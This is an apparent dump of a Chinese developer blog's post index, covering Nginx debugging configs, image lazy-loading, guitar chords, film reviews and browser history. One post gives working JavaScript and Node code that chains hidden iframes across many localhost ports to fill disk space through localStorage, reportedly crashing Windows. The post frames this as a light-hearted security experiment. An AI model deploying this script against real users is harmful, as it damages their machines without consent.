last;&#125;后续的事情，可以在本地创建一个cgi-bin文件夹，在里面放置需要映射的文本，并开启服务到8080端口即可。 场景五：移动侧调试Fiddler 有一个勾选项 Allow remote computers to connect，并可以指定 listen port 可以使得手机/其它终端通过将本机设为代理而访问本机环境，与 hosts 配合会很实用。 这个功能，用Nginx也很容易做到。通过 default_server 作为代理，手机终端通过设置网络代理为本机IP和相应的 listen port，从而可以访问本机的 Web 服务。 其中也是用到了ngx_http_proxy_module模块的配置：12345678910111213141516171819202122 server &#123; listen 80 default_server; server_name localhost; resolver 8.8.8.8; location / &#123; proxy_set_header Host $host; proxy_set_header X-Real-Ip $remote_addr; proxy_set_header X-Forwarded-For $remote_addr; proxy_pass http://$host; &#125;&#125;server &#123; listen 80; server_name ke.qq.com; location / &#123; proxy_set_header Host $host; proxy_set_header X-Real-Ip $remote_addr; proxy_set_header X-Forwarded-For $remote_addr; proxy_pass http://127.0.0.1:9091/; &#125;&#125; 边角料除去特定场景，Nginx的一些配置也跟前端息息相关。以下简单罗列，作为边角材料。 1.nginx_http_concat资源合并，处理CDN combo。例如通过这样的方式http://example.com/??style1.css,style2.css,foo/style3.css访问合并后的资源。 2.ngx_http_image_filter_module图片处理。提供图片缩放，jpg压缩，旋转等特性。 3.适配PC与移动web总体可运用ngx_http_proxy_module，去实现路径转发。判断平台类型的Nginx配置，在开源项目detectmobilebrowsers中可以找到。 后记学习Nginx，我本身只是出于开开眼界的目的。而的确发现了一些很有启发性的特质。于前端开发，无论线上线下，熟练掌握基本配置，可以做出许多提高效率的工具。但既然是工具，熟手就好。 比如Fiddler直观，但Nginx更底层，更灵活，应当按照实际选择即可。 话说回来，后来心情有些惆怅。想起之前，我用NodeJs写过一个八百行的本地调试服务，如今更习惯用Nginx的几行配置。不过我又想，既然我已经花了时间去写，为什么还要花时间去用？！ 心情又好起来了。（等等有什么不对，管它呢…） END.15.11.03 Litten.","tags":[{"name":"前端","slug":"前端","permalink":"https://lxxstar987.gitee.io/lxx1997.github.io/tags/%E5%89%8D%E7%AB%AF/"}]},{"title":"作为一个前端，可以如何机智地弄坏一台电脑？","date":"2015-07-06T14:30:00.000Z","path":"2015/07/06/hack-in-localstorage/","text":"有人说，前端的界限就在浏览器那儿。 无论你触发了多少bug，最多导致浏览器崩溃，对系统影响不到哪去。这就像二次元各种炫酷的毁灭世界，都不会导致三次元的世界末日。然而，作为一个前端，我发现是有方式打开次元大门的… 这个实验脑洞较大，动机无聊，但某种意义上反映了一些安全问题。想象一下，有天你在家里上网，吃着火锅还唱着歌，点开一个链接，电脑突然就蓝屏了！想想还真有点小激动。 起因故事得从localStorage说起。 html5的本地存储，相信大家都不陌生。将数据以二进制文件形式存储到本地，在当前应用得非常广泛。windows下的chrome，localStorage存储于C:\\Users\\xxx\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\Local Storage文件夹中。但如果任由网页无限写文件，对用户硬盘的伤害可想而知，因而浏览器对其做了大小限制。 对于一个域名+端口，PC侧的上限是5M-10M之间，移动侧是则不大于2.5M。 那么问题就变成：这样的限制足够保护用户硬盘了吗？ 关键关键的问题在于，这一限制，针对的是一个域名+端口。也就是说，你访问同一个域名的不同端口，它们的localStorage并无关联，是分开存储的。 我用node简单地开启了服务器，这时，用户访问http://127.0.0.1:1000到http://127.0.0.1:1099这100个端口，会请求到同一个页面：index.html： 1234567891011121314151617var http = require(&#x27;http&#x27;);var fs = require(&#x27;fs&#x27;);//100个端口for(var port = 1000; port&lt; 1100; port++)&#123; http.createServer(function (request, response) &#123; //请忽略这种循环读文件的方式，只为了简便 fs.readFile(&#x27;./index.html&#x27;, function(err, content)&#123; if(err) &#123; &#125; else &#123; response.writeHead(200, &#123; &#x27;Content-Type&#x27; : &#x27;text/html; charset=UTF-8&#x27; &#125;); response.write(content); response.end(); &#125; &#125;); &#125;).listen(port, &#x27;127.0.0.1&#x27;);&#125; 当然，这个index.html里涉及了localStorage写操作。 123456var s = &quot;&quot;;//慢慢来，别写太大了，好害怕…for(var i=0; i&lt; 3 * 1024 * 1024; i++)&#123; s += &quot;0&quot;;&#125;localStorage.setItem(&quot;testData&quot;, s); 我试着用浏览器分别访问了几个端口，结果是分开存储。一切跟剧本一样。 自动遍历但这种程度还不够。如果要实验变得更好（xie）玩（e）一些，问题就变成如何让用户自动遍历这些端口？ iframe是个好的尝试。只要一打开http://127.0.0.1: 1000，页面的脚步就会创建一个iframe，去请求http://127.0.0.1: 1001，一直循环下去。 1234567891011121314151617181920212223var Main = (function()&#123; var _key = &quot;testData&quot;; var _max = 1100; //最大限制 return &#123; init: function()&#123; //慢慢来，别写太大了，好害怕… var s = &quot;&quot;; for(var i=0; i&lt; 3 * 1024 * 1024; i++)&#123; s += &quot;0&quot;; &#125; localStorage.setItem(_key, s); var port = parseInt(location.port)+1; if(port &gt; _max) return; //新添加iframe var url = &quot;http://127.0.0.1:&quot; + port; var $iframe = document.createElement(&quot;iframe&quot;); $iframe.src = url; document.getElementsByTagName(&quot;body&quot;)[0].appendChild($iframe); &#125; &#125;&#125;)(); 当然iframe我们还可以设置为不可见，以掩盖这种不厚道的行为…比方说，有人发给你一个链接，你打开后发现是个视频，而你根本注意不到背后的脚本，在视频播放的几分钟里，快要把你的C盘写满。 然后我就看到请求如潮水渐涨： 但是，请求到1081端口，最新的chrome就崩溃掉了…原来iframe嵌套太多，已经到达了浏览器的极限。 ###防止浏览器崩溃 C盘还未撑满，同志还需努力。怎么办？ 突然想到，到达iframe极限之前，我们可以重定向啊。每访问50个端口，就使用window.location.href重定向一次，去确保浏览器不崩溃。 1234567891011121314151617181920212223242526272829var Main = (function()&#123; var _key = &quot;testData&quot;; var _max = 1200; //最大限制 var _jumpSpace = 50; //为避免iframe过多导致浏览器crash，每50个执行跳转 return &#123; init: function()&#123; //慢慢来，别写太大了，好害怕… var s = &quot;&quot;; for(var i=0; i&lt; 3 * 1024 * 1024; i++)&#123; s += &quot;0&quot;; &#125; localStorage.setItem(_key, s); var port = parseInt(location.port)+1; if(port &gt; _max) return; if(port % _jumpSpace == 0)&#123; //每50个，重定向一次 window.location.href = url; &#125;else&#123; //新添加iframe var $iframe = document.createElement(&quot;iframe&quot;); $iframe.src = url; document.getElementsByTagName(&quot;body&quot;)[0].appendChild($iframe); &#125; &#125; &#125;&#125;)(); 事实证明，这种蛮拼的方法的确可行。 至此，只要访问http://127.0.0.1: 1000，就会往Local Storage文件夹里写入近500M无用数据： 里面的数据是这样的： 继续实验的黑科技算了下我的C盘还有空间嘛，那就把端口数量从100增长到200个。结果是这样的，到达了1.17G大小。 在后续的实验中，我就慢慢的把端口数量与存储的数据调大。 电脑也运行得越来越慢。这是为什么呢？ 我观察到，有时候执行localStorage.setItem()后，在文件夹里不一定立即能看到数据文件。怀疑这些数据会被chrome先放到内存里，以避免重复读写带来的消耗，在空闲或关闭的时机，再写进硬盘里。 但此时，浏览器已经影响到系统了。它处于一种“不会崩溃”，但“因为占用了许多内存，已经妨碍用户电脑的正常使用”的状态。即使用户关闭了浏览器窗口，也不会很快恢复。要知道读写任务并不是随窗口关闭而终止的，否则浏览器会丢失数据。 遭遇黑科技的人们能做的只有： 等待； 用任务管理器关掉chrome进程，再等待； 相信并尝试“重启电脑解决90%电脑问题”的科学论断 可以说，浏览器的内心几乎是崩溃的。 最后最后，还是得用严肃脸告诫一下：害人之心不可无。本实验，从一开始就是怀揣着将安全问题上交给国家的初衷去做的（是的就是这么纯粹）。 后续，看着C盘还有2G空间，我又把端口增长到2000个，试下会发生什么。由于请求过多，需要一定时间，我就去做别的事情了。回来后发现房间安静祥和，美轮美奂，一片蓝光，像是加了特技。 那么问题来了，计算机修理哪家强？有点急…","tags":[{"name":"JavaScript","slug":"JavaScript","permalink":"https://lxxstar987.gitee.io/lxx1997.github.io/tags/JavaScript/"},{"name":"安全","slug":"安全","permalink":"https://lxxstar987.gitee.io/lxx1997.github.io/tags/%E5%AE%89%E5%85%A8/"},{"name":"黑科技","slug":"黑科技","permalink":"https://lxxstar987.gitee.io/lxx1997.github.io/tags/%E9%BB%91%E7%A7%91%E6%8A%80/"}]},{"title":"半年新影短评","date":"2015-06-05T15:00:00.000Z","path":"2015/06/05/viewing-commentary/","text":"直视自我内心的人，是值得敬佩的。我不是，但我有个大学同学是，因为他能坚持每天写日记。 越长大，日记越是件难事。 我翻看很小时候的日记本，寥寥几笔，满满回忆；再长大一些，不好看了，因为有些虚假，更多是为了应付老师的作业。没有了真情实意，日记更像是作文。你看这名字的意义也够直接，“作”的文。 如果内心的小人与你说话，却都是谎话，记录又有何意义？所以心智成熟后，日记越来越难被坚持下来。 更残酷的是，有时你根本不知道自己是不是在说谎！你不确定是否喜欢现在的工作，不确定自己的付出是否有回报，以及，不确定爱不爱她 现代人想了一个极好的方法，叫——放空自己把跳出来跟你争论的小人掩藏在游戏与歌酒里，什么都不去想，不去问。偶尔这样一下也挺好。 但我觉得，真实的记录还是要有。 半年以来，一直督促自己，要养成做完事情记(tu)录(cao)一下的习惯。无论是旅行，聚会，书籍，电影，与长时间循环过的歌曲。当然这些记录大多依靠手机，随想随记，潦草简短。原则是，记录过的东西，就不再删改，即使后来看起来会很幼稚。真实的记录，自有它不容改变的尊严。 将笔记里杂七杂八的条目汇总，就新影而言，居然有这么多记录了。 海洋之歌 5 如诗如颂，如歌如梦美好到出戏去看播放的进度条，希望它走得不要太快就像需要重复确认起床时间的失眠夜 浪客剑心 3.5 剑心最帅的不是眼花缭乱的剑技而是抱着薰小姐说“沙扬娜拉”时逆刃刀注定要重回杀戮，告别眼前的爱人，告别悔过的自我这声简短的再见合适不过 明日边缘 3.5 能读档真好！阿汤哥教你for循环从入门到精通 辉夜姬物语 4 罪罚与眷恋，缘起随缘灭仓央嘉措说：“世间之事，除却生死，哪一件事不是闲事？”一句入世的废话，也是出世的实话 智取威虎山 3 张涵予的眼影和林更新的演技撑起了这版萌系王牌特工 哪啊哪啊神去村 5 十年之计，莫如树木；终身之计，莫如树人一切神佑，源于热爱看《海贼王》时，船匠弗兰奇的师傅临别前的一番话动人至深：谁都可以嫌弃你的船，唯独你，不可以。 外形醉汉PK地球神 3.5 任何人去探讨宗教都显得力微，来自星星的你却是个例外旁观者的角度让人想起少年派前三十分钟“地球是很危险的”，但同时也是有爱的 重返20岁 4 剧本精良，彩蛋满分，杨子姗的演技太惊艳比起“奇怪的她”更喜欢这部当我们思考重返20岁能干什么时其实一切都还没晚 王牌特工 4.5 很难再能看到如此不落俗套的表演马修·沃恩想说，以前的谍战片都简称JB，都是狗，看我有种一枪崩了它们慢着，我说着逗你玩呢，是空弹啊，呵呵 绣春刀 4 “起先，一家互联网公司的产品暴露了一个重大bug，派三个程序员去排查。程序员发现啊，这bug能赚一大笔钱，因而谎报bug已fix而导致的一系列血案。结论是改bug得认真。”——我朋友（已拉黑）眼中的绣春刀 战狼 3.5 一切的槽点都可以用诚意来弥补附：《主旋律电影如何不惹急豆瓣小清新指南》1、主角得有痞子气2、能泡到女上司 霍比特人三 五军之战 4 比起原著，李建军的表演更加丰满。魔龙已死，宝石归位，情谊长传，孤山永在，它的意义应当是开始，而感觉却是一曲终了，恍之若别我们也要跟中土世界说再见了。 狼图腾 3 小说《狼图腾》，是我自己买的书中，为数不多看不下去的因而没太多能说的但就电影来看，太想说狼，但说狼是为了说人因而敬畏与情感，在高大上的图腾与乌托邦面前略显薄弱 小森林 夏秋篇 5 极致内敛和极致色欲，这两种电影估计都只有日本人能拍出来真正无剧情无尿点的五星神作，半年最佳但此片在电影院里看会打折扣适合下载个1020P高清，一个人，拉窗帘，躲被窝里，跟极致色欲那种的观影模式一个样 复仇者联盟二 4 看1时，是跟大学最好的几个朋友去，看完后热血沸腾，我说，我们飞回寝室去！如今复仇者再联盟，你们在哪里？我们打一架也好哇 ——litten 6.5晚","tags":[{"name":"生活","slug":"生活","permalink":"https://lxxstar987.gitee.io/lxx1997.github.io/tags/%E7%94%9F%E6%B4%BB/"},{"name":"旧事","slug":"旧事","permalink":"https://lxxstar987.gitee.io/lxx1997.github.io/tags/%E6%97%A7%E4%BA%8B/"}]},{"title":"和弦推导逻辑简析","date":"2015-05-25T15:01:00.000Z","path":"2015/05/25/logic-of-chord/","text":"诚然，吉他有上千个和弦。世界上最厉害的吉他大师，也无法一眼辨识出所有的和弦。 更多时候，我们熟记几个基本的和弦，然后通过一定的计算法则，去推导其他的和弦。因而推导的逻辑就非常重要。 《吉他三月通》一书把这乐理洋洋洒洒说了一百多页，我想试着让事情简单一些。 最后，我们将逻辑实现成一个小程序，可以方便打印出想要推导的和弦。 音乐与数学既然是逻辑，都可以用数学去建模，然而音乐与数学之间，却有一点非常重要的差异。 在这之前，我们得谈点有趣的事情，它们都有共同的原因： 为什么我们会觉得某首歌很“中国风”？ 为什么某些日本的传统音乐听起来很“诡异”？ 为什么钢琴要做成黑键白键，所有键都一样不行吗？ 我们常用—— 正整数：1、2、3、4、5、6、7 ，对应和弦：C、D、E、F、G、A、B，对应音符：Do、Re、Me、Fa、So、La、Ti 每个正整数之间，都是相差1；而按频率高低排列的音符，由于历史原因，它们并不是等差数列。 实际上，4比理想的要低一点，7比理想的要高一点，其他的5个音，则基本在理想线性曲线上！ 这5个跟理想比较吻合的音，就是天朝古代的五音阶：宫、商、角、徵、羽。“中国风”的歌曲，大多使用了这五个音，所以让人感到舒服和温和；而日本的传统音乐，反其道而行用了许多4与7（这么说也不太对，具体是受阴阳调式影响，但表现上大概如此），有一种幽静阴深的效果。 所以，以上问题的原因是：音符的递增不完全是线性的！ 我们得把4和7这两个不和谐点标志出来，就出现了“半音和全音”的理论。把3到4和7到1这两个不满一个跨度的叫做半音；其他相邻音符之间，都叫做全音。而造物主的神奇之处在于：两个半音等于一个全音。 音乐的世界跟数学的这点不同，会在后面逻辑推导上会给我们一点小小的麻烦。 音乐家与程序员试想，如果程序员要完成描述音阶的数据结构，会如何设计呢？ 通常，应该先规划“最小粒度”。而“半音”刚好是最合适的选择。 音乐家与程序员的处理方式如出一辙，钢琴上夹在两个白键之间的黑键，吉他相邻品丝之间，都是为了表现出半音。 如果用程序描述吉他品丝的关系就是： 1var scale = [2, 2, 1, 2, 2, 2, 1]; //3-4是半音，7-1也是半音，相隔1品；其他是全音，相隔2品 吉他与尺子知道了这些，我们就好比掌握了一把尺子的刻度。 在尺子上，如果一个刻度表示1cm，那么从3cm往后推两个格子，就是5cm；把吉他想象成尺子，一个刻度表示半音，和弦之间就可以推导了。 与众不同的是，这把尺子首尾相连，更像一个循环的圈。 1234刻度： 2品 2品 1品 2品 2品 2品 1品 2品 2品和弦：C +----&gt; D +----&gt; E +----&gt; F +----&gt; G +----&gt; A +----&gt; B +----&gt; C +----&gt; D +----&gt; ……音符：Do +----&gt; Re +----&gt; Me +----&gt; Fa +----&gt; So +----&gt; La +----&gt; Ti +----&gt; Do +----&gt; Re +----&gt; ……整数：1 +----&gt; 2 +----&gt; 3 +----&gt; 4 +----&gt; 5 +----&gt; 6 +----&gt; 7 +----&gt; 1 +----&gt; 2 +----&gt; …… 因而，一个和弦可以有多种方式弹奏。比如C和弦，除了最基础的开放式（不需要用食指横按品丝）指法，我们还可以用A和弦的指法实现： 123C = B + 1品 = A + 2品 + 1品 = A + 3品 所以，我们用食指横按住第3品（或者用变调夹夹第3品），然后再加上A和弦的开放式指法，就形成了一个C和弦。 同理也可以用E和弦实现： 123456C = B + 1品 = A + 2品 + 1品 = G + 2品 + 2品 + 1品 = F + 2品 + 2品 + 2品 + 1品 = E + 1品 + 2品 + 2品 + 2品 + 1品 = E + 8品 横按的位置就在第8品上。 其实大部分情况下，我们都是用A，E，Am，Em这四个和弦去推导其他和弦，因为这几个和弦横按与转换比较方便，特别是在扫弦的时候。 程序实现明确逻辑之后，就差程序实现了。但这之前，我们定了程序的最小粒度是1品，就无可避免遇到一个问题： 如果A + 2品 = B，那A + 1品 = ？ 这个和弦介于A与B之间，人们把它称为升A或降B，对应记法是A#或Bb。 至此我们可以列出，用E指法和A指法推导的所有和弦的横按位置： 12345678910111213141516171819202122232425262728293031323334353637383940var positions = &#123; &quot;E&quot;: &#123; &quot;A&quot;: 5, &quot;A#&quot;: 6, &quot;Bb&quot;: 6, &quot;B&quot;: 7, &quot;C&quot;: 8, &quot;C#&quot;: 9, &quot;Db&quot;: 9, &quot;D&quot;: 10, &quot;D#&quot;: 11, &quot;Eb&quot;: 11, &quot;E&quot;: 12, &quot;F&quot;: 1, &quot;F#&quot;: 2, &quot;Gb&quot;: 2, &quot;G&quot;: 3, &quot;G#&quot;: 4, &quot;Ab&quot;: 4 &#125;, &quot;A&quot;: &#123; &quot;A&quot;: 12, &quot;A#&quot;: 1, &quot;Bb&quot;: 1, &quot;B&quot;: 2, &quot;C&quot;: 3, &quot;C#&quot;: 4, &quot;Db&quot;: 4, &quot;D&quot;: 5, &quot;D#&quot;: 6, &quot;Eb&quot;: 6, &quot;E&quot;: 7, &quot;F&quot;: 8, &quot;F#&quot;: 9, &quot;Gb&quot;: 9, &quot;G&quot;: 10, &quot;G#&quot;: 11, &quot;Ab&quot;: 11 &#125; &#125;; 同时，将E、A的开放和弦的指型描述出来： 12345678910111213141516171819202122232425//这里仅列出E、A大小和弦，共四种指法//更详细指法数据结构可参看后面demochord_shapes = &#123; &quot;M E&quot;: &#123; name: &quot;Maj&quot;, chord: [[3, 2], [4, 3], [5, 3]], bars: [&#123;from_string: 6, to_string: 1, fret: 1&#125;] &#125;, &quot;m E&quot;: &#123; name: &quot;m&quot;, chord: [[4, 3], [5, 3]], bars: [&#123;from_string: 6, to_string: 1, fret: 1&#125;] &#125;, &quot;M A&quot;: &#123; name: &quot;Maj&quot;, chord: [[2, 3], [3, 3], [4, 3], [6, &quot;x&quot;]], bars: [&#123;from_string: 5, to_string: 1, fret: 1&#125;] &#125;, &quot;m A&quot;: &#123; name: &quot;m&quot;, chord: [[2, 2], [3, 3], [4, 3], [6, &quot;x&quot;]], bars: [&#123;from_string: 5, to_string: 1, fret: 1&#125;] &#125;&#125;; 分别传递“和弦名”,“指法”，“类型”作为参数，我们就可以很容易的画出和弦： 12createChord(&quot;C&quot;, &quot;A&quot;, &quot;M A&quot;); \\\\画出C和弦，用A指法，定义类型是大三和弦(Maj)createChord(&quot;D&quot;, &quot;A&quot;, &quot;m A&quot;); \\\\画出Dm和弦，用A指法，定义类型是小三和弦(Minor) Demo以下是完整Demo，将上述chord_shapes的指型补充得更完整。 并且尝试用A指型，自动生成了C调的7个常用和弦。 End. 2015.5.25","tags":[{"name":"旧事","slug":"旧事","permalink":"https://lxxstar987.gitee.io/lxx1997.github.io/tags/%E6%97%A7%E4%BA%8B/"}]},{"title":"说到加载图片，我们可以谈些什么","date":"2015-04-28T15:54:00.000Z","path":"2015/04/28/img-lazy-load/","text":"其实，一开始让我在网页中加载一张图片，我是，是拒绝的…因为实在太简单了。 &lt;img src=&quot;xx.jpg&quot; /&gt;是每个前端开发都会的技能。然而，如果你想做到极致，事情还没有这么简单。 最近实现了个图片加载器，用于大型web前端项目中，关于加载图片这一话题，仔细想来可以加许多的特技。 第一步：滚屏加载这是最容易想到的点，也是一开始就准备做的。 随web体验的进步，滚屏加载代替分页加载的情形越来越多。也就是先预留图片位置，而不去加载图片，直到这个预留区域滚动到屏幕中，用户能看见了，才去加载图片。如此一来，有“按需加载”的意味，由于图片加载延后，不抢占带宽，在打开页面的首屏会快很多。我们称之为“懒加载(lazyload)”。 其实现也很简单，在html里面写&lt;img lazy-src=&quot;xx.jpg&quot; /&gt;，然后用js去判断这个节点是否出现在屏幕中，如果是，则取出lazy-src属性，赋值成&lt;img lazy-src=&quot;xx.jpg&quot; src=&quot;xx.jpg&quot;/&gt;，触发此节点onload，这就实现最简单的滚屏加载了。 第二步：特殊状态处理特殊状态有两种：加载中与加载失败。这两种情况的处理逻辑相类似，拿加载中的逻辑做例子。 图片触发加载，到图片加载完成（或失败）之间，肯定会有一段时间。不做处理的话，用户在等待的过程中，就只能看到空白的区域，非常的奇怪。在低网速，以及用户非常快的拉滚动条的情形下，这种现象将更加明显。 那么在触发onload之前，就需要补一些逻辑，展示对应的loading图。将需要处理的img节点作为参数，调用tempImg函数，克隆一个节点强行插在img之前，用于loading中的展示。 123456789101112var tempImg = function(target)&#123; var w = target.width(); var h = target.height(); var tempDom = target.clone().addClass(&quot;lazy-loding&quot;).insertBefore(target); if(w/h == 1)&#123; tempDom[0].src = &quot;http://9.url.cn/edu/img/img-loading.png&quot;; &#125;else&#123; tempDom[0].src = &quot;http://9.url.cn/edu/img/img-loading2.png&quot;; &#125; target.hide();&#125; 第三步：上报监控这一步在大型前端项目中非常重要，也是经常被忽略的地方。尽管需要简易的后台配合，但不算麻烦的上报监控，能让产品更加稳定和健壮。 我在两个地方用到了上报。其一是图片加载失败，触发onerror时，这样一来我们能知道每天图片拉取失败的量；其二是图片加载的时间，能够帮助我们分析cdn服务是否异常，分析全国慢速用户比例等等。 而所谓的上报其实就是一个http请求，我会大概把这些信息带上 123456 log(&#123; &#x27;type&#x27;: &#x27;error&#x27;, &#x27;msg&#x27;: &#x27;lazyload拉取图片失败上报 &#x27;, &#x27;url&#x27;: window.location.href, &#x27;pid&#x27;: 414342 //产品对应的id&#125;); 第四步：居中截取这是前端无可避免的一个问题，先来说下此问题的背景。 由于我们是先用一个空白的img标签占位，再去加载图片，如果图片的高度特别长（比如新浪长微博），加载完成时就会撑开节点，引起滚动条的跳动。由于移动端屏幕较PC窄，一个跳动就可能让你找不到前一秒正在浏览的内容，这种体验尤其严重。在移动端的web设计中，可以看到许多知名互联网公司的产品，也经常忽略这一点。 因此我们可以限定占位区域的size，以此区域来做居中截取。当占位区域与图片最终展示同宽同高时，就不会引起跳动，而且也保持了视觉的一致性。 其原理如下，先判断是竖向长型图，还是横向长型图，根据不同的情况，优先让宽或高填充满占位区域，然后通过不同的负margin去实现居中。 123456789101112131415var calSize = function($img) &#123; var w = $img.width(), h = $img.height(), width = size[0], height = size[1]; if(w+h == 0) return; //如果是长型图，优先适配宽度，高度居中截取 if(w/h &gt; width/height)&#123; var newWidth = height * w / h; var margin = (width - newWidth)/2; $img.height(height).css(&#123;&quot;margin-left&quot;: margin&#125;); &#125;else&#123; var newHeight = width * h / w; var margin = (height - newHeight)/2; $img.width(width).css(&#123;&quot;margin-top&quot;: margin&#125;); &#125;&#125; 第五步：支持webpwebp格式图片是google开发的一种旨在加快图片加载速度的图片格式，压缩提交大概只有jpg的2/3。随chrome的比例越来越多，其实让更多用户体验到webp也是一件好事。 那么问题来了，怎么去判断用户的浏览器是否支持webp呢？根据ua去判断是个好方法，但不太靠谱，因为chrome中其实也有设置，让它不能去支持webp，而且webkit本身就开源，会衍生出很多你不知道名字的浏览器。 最终我使用的是特性检测： 12345678910111213141516if(!supportedWebPIsLoading) &#123; supportedWebPIsLoading = true; var images = &#123; basic: &quot;data:image/webp;base64,UklGRjIAAABXRUJQVlA4ICYAAACyAgCdASoCAAEALmk0mk0iIiIiIgBoSygABc6zbAAA/v56QAAAAA==&quot; &#125;, $img = new Image(); $img.onload = function () &#123; supportedWebPIsLoading = false; $.cookie.set(&quot;iswebp&quot; , +supportedWebP); &#125;; $img.onerror = function () &#123; supportedWebP = false; supportedWebPIsLoading = false; $.cookie.set(&quot;iswebp&quot; , +supportedWebP); &#125;; $img.src = images.basic;&#125; 我们会让浏览器试着加载一张非常小的base64格式的webp图片，如果能够正常加载，说明是支持webp的。 并且，会把测试记录在cookie里，所以第二次直接从cookie里读结果，基本不会影响性能。完成了最重要的检查，我们就可以放心让服务器返回不同格式的图片了。 End.","tags":[{"name":"JavaScript","slug":"JavaScript","permalink":"https://lxxstar987.gitee.io/lxx1997.github.io/tags/JavaScript/"}]},{"title":"IT圈装逼速成指南","date":"2015-02-21T14:50:00.000Z","path":"2015/02/21/guide-for-zb/","text":"我有个朋友，春节回来了大家聚在一起，说自己买了iphone6但总觉得自己还是很low，问这是怎么回事？其实生活过得怎样，跟iphone是两码事。先把生活过得充实了，切莫本末倒置。当然，我们可以就“IT圈如何愉快的装X”敞开心扉谈下这个问题。以下几点仅供参考，实践时请注意预防雷劈。 谈资类1、谈乔纳森。苹果设计师乔纳森。你要往死里黑他，但一定请记住，得是爱到深处自然黑那种黑。顺手拿过iphone6当惊堂木一拍（兄弟你得狠下这个心），当小伙伴因震惊不解而望着你时，你微微一笑，缓缓叹气：“彩虹山上的渐变爵士，身上却流着极简的血液…” 2、谈亚马逊。要坚定保持亚马逊没啥黑点的观点不动摇。当别人说到界面和UI时，你整个人都要散发出一种“亚马逊的产品很牛的所以界面什么的并不重要”的气质。 3、谈阿里IPO。这个话题面前，谈什么都会很low。但你可以很随意的说：哈哈，现场wifi信号一定很强！小伙伴们细细一品，就没人敢说话了。恰恰是这句随意的话，突显了你对整个路演格局的了然于胸！300名销售人员，主场和分场，等电梯要半小时，队伍有十八个弯…这些信息量都涵盖在这句话里了。 话题类1、关于APP。[ˈæp] 念阿破（与爱破也比较像，参见音标），不能把三个字母拆开念成A P P。总的来说有三大注意事项：1、国内的，不玩。2、流行的，不玩。3、名声响的，不玩。 2、关于手机贴膜。营造出一种“一个批判者的自我愤怒”的气氛，让人感觉你在贴与不贴之间，一定有一段不可言说的故事。然后表现出自己已超脱了挣扎，在自己这个level，跟大家再讨论现实问题已毫无意义。因而你只好微笑着说：“你们不觉得让屏幕随手机一起慢慢变老，是一件很浪漫的事情吗？” 3、关于朋友圈。A：怎么很少见你发朋友圈？你：哦…国内的sns（一定要秀个英文）不太有意思，我回头把我ins帐号发你。当然你的朋友圈里还是可以写些东西，参考文字：脑残粉了一回，终于遇到了Trip Hawkins，从Spore开始就已喜欢上了EA… 4、关于BAT。不谈。 技巧类1、欲扬先抑。在赞美目标的之前，把同类产品先夸一遍。不经意间，透露出自己知识面广，却又别有追求。具体句式可参考《中国好声音》：“杨坤老师，我一直很喜欢你，但是…” 2、回答问题。使用知乎文风，可助你吹的牛逼鹏翔万里，栩栩如生。有人会问，什么是知乎文风，难学吗？不难，记住两个词就可以了。第一个词在最开头用，“谢邀”。不管有没有人邀你，这主要是营造“我不是一个人在战斗”的氛围，以及一种“我本沉默奈何盛情难却”的傲娇。第二个词在最末尾用，“以上”。不管你以上的内容怎样，就这么一个词，有种老子发言结束了，你们该鼓掌的鼓掌该献花的献花的微妙情怀。 以上。","tags":[{"name":"生活","slug":"生活","permalink":"https://lxxstar987.gitee.io/lxx1997.github.io/tags/%E7%94%9F%E6%B4%BB/"},{"name":"旧事","slug":"旧事","permalink":"https://lxxstar987.gitee.io/lxx1997.github.io/tags/%E6%97%A7%E4%BA%8B/"}]},{"title":"展示豆瓣未登录首页的chrome插件","date":"2014-10-16T00:15:00.000Z","path":"2014/10/16/douban-index-for-chrome/","text":"某天，我惊讶的发现，豆瓣未登陆时的首页，比登录后的首页还要好玩！其实，并不是只有我一个人这么觉得，我甚至见过有人专门打开隐身窗口刷此页面，真是机智的少年。 不是很理解之余，这个chrome插件豆瓣首页 for chome就诞生了。 但这个问题很有意思。 进入豆瓣相关页面，在导航条处会有“默认首页”tab，如截图虚线框处所示。点击即可进入。 这个问题有意思的地方在于，在国内很少有人做类似“减法”的东西。未登录时展示聚合的热门内容；登录后展示与个人相关的推荐内容，两者竟只取其一。大家例行吐槽，吐槽后接着用。 我找到了官方的一些解释：《由头和环境：新豆瓣首页看待世界的方式》 懂你的，会随你而变。… 希望豆瓣在你眼中不是一成不变的寂静的水泥地面，而是和你共呼吸、同作息的有氧森林。 这句话说得很棒，各种产品的未来愿景都应如是。看到这会知道为什么以前的“豆瓣猜”会变成“订阅”，即使两者没太大本质的区别，但前者是被动的感觉，后者则是表达主动的需要。 那么推荐算法在这个产品形态中，则扮演了一个非常重要的角色。但目前，我个人感觉豆瓣的推荐并不能十分使人满意。 因而有了这个chrome插件。我做这个插件，最由衷的愿望，就是某天能把这插件给消灭掉。 附：github地址 litten 2014.10.16","tags":[{"name":"工具","slug":"工具","permalink":"https://lxxstar987.gitee.io/lxx1997.github.io/tags/%E5%B7%A5%E5%85%B7/"},{"name":"chrome","slug":"chrome","permalink":"https://lxxstar987.gitee.io/lxx1997.github.io/tags/chrome/"}]},{"title":"浏览器野史 UserAgent列传（下）","date":"2014-10-05T09:26:00.000Z","path":"2014/10/05/history-of-browser-useragent2/","text":"前篇《浏览器野史 UserAgent列传（上）》 六、师夷长技前面说到，微软靠Windows系统捆绑IE销售。而Windows自然也有它的对手，Linux。一个技术快速发展的时代，系统的世界里也是战火纷飞。Linux系统自从有了可视化界面，也需要浏览器呀。桌面系统KDE的缔造者们就发明了一个。 真是具有跨时代意义的工具呀，好伟大呀，人们在想，它叫什么呢？但大神就是大神，大神就是讲究先从文字上占据压垮你的气势。先有Navigator航海家，再有Explorer探索者，咱就叫Konqueror(Conqueror的变体)征服者吧。行行行。我已懒得理这帮大神… 可是，问题来了。Konqueror使用KHTML排版引擎，即使它们认为自己跟Gecko引擎一样优秀，但用户不买单。你UserAgent里没有“Gecko”字样，我就不给你经过优良排版的html。结果，Konqueror思来想去，做了一个艰难但很萌的决定，把UserAgent写成Mozilla/5.0 (compatible; Konqueror/3.2; FreeBSD) (KHTML, like Gecko)…这就是现代浏览器里like Gecko这一萌词的由来。 就这样，伟大的排版引擎KHTML为了获得更好的资源，师夷长技。这并没什么不好，却造成了UserAgent的越发混乱。KHTML与Gecko这一对，永远卿卿我我比翼双飞在UserAgent里面了。那个满含深意的“like”，有人觉得翻译成“像”，但也有人觉得应该是“喜欢”… 七、世界大战首先是IE冷静下来了，他觉得，你们不带这么玩的？就我年少时不懂事，首先改了个Mozilla字样，后面追究这历史我岂不是成了罪魁祸首？我改还不行吗？在IE6，它明确自己UserAgent为Mozilla/4.0 (compatible; 